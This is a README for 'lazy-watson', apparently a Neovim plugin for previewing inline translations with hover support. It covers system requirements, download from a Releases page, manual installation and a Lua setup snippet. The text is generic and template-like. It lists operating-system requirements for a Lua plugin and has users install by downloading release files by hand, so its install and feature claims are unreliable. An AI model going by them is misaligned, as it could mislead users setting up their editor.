# 🌟 lazy-watson - Seamless Translation In Neovim

![Download lazy-watson](https://img.shields.io/badge/Download-lazy--watson-brightgreen)

## 🚀 Getting Started

Welcome to lazy-watson! This Neovim plugin allows you to view inline translations with hover support, making your internationalization tasks smoother and more efficient.

## 💻 System Requirements

To use lazy-watson, ensure you have the following:

- Neovim version 0.5 or higher.
- A compatible operating system: 
  - Windows 10 or later
  - macOS Mojave or later
  - Linux (recent distributions)

## 📥 Download & Install

To download lazy-watson, visit the Releases page. You will find the latest version available for download. Click the link below:

[Visit the Releases Page to Download](https://github.com/gurlal-m4s/lazy-watson/releases)

After downloading, follow these steps to install the plugin:

1. Open Neovim.
2. Navigate to your configuration directory, usually located in `~/.config/nvim/`.
3. Create a directory called `lua` if it doesn’t exist.
4. Inside the `lua` directory, create another folder named `lazy-watson`.
5. Copy the downloaded files into the `lazy-watson` folder.

## 🌍 Features

lazy-watson provides several useful features:

- **Inline Translation Preview**: View translations without leaving your editing space.
- **Hover Support**: Simply hover over a word to see its translation.
- **Easy Integration**: Designed to work seamlessly with Paraglide JS.
- **Localizable Interface**: Supports multiple languages for global users.

## 🛠️ Setting Up

To get the most from lazy-watson, you may want to adjust settings. Open your Neovim configuration file (`init.vim` or `init.lua`) and add the following lines to enable the plugin:

```lua
require('lazy-watson').setup({
  lang = 'en', -- Change to your preferred language
  hover = true, -- Enable hover support
})
```

This setup will help you customize lazy-watson according to your needs.

## 🌟 Using lazy-watson

After installation, you can start using lazy-watson immediately. Here’s how:

1. Open any file in Neovim.
2. Hover over a word in your text.
3. A tooltip will display the translation.

You can explore further functionalities as you become familiar with the plugin.

## 📚 Support & Contribution

If you encounter issues or have questions while using lazy-watson, check our GitHub Issues page. You can also contribute by reporting bugs or suggesting features.

For detailed documentation and advanced usage, visit the Wiki section of our repository.

## 🔗 Useful Links

- [GitHub Repository](https://github.com/gurlal-m4s/lazy-watson)
- [Visit the Releases Page to Download](https://github.com/gurlal-m4s/lazy-watson/releases)
- [Documentation](https://github.com/gurlal-m4s/lazy-watson/wiki)

## 🙋 Frequently Asked Questions

### Can I use lazy-watson with other plugins?

Yes, lazy-watson is designed to work alongside other Neovim plugins.

### What if I face issues during installation?

Feel free to check the GitHub Issues page or reach out for help.

### Is there a way to customize translations?

Currently, you cannot customize translation sources, but you can request this feature on our Issues page.

Thank you for using lazy-watson! Happy translating!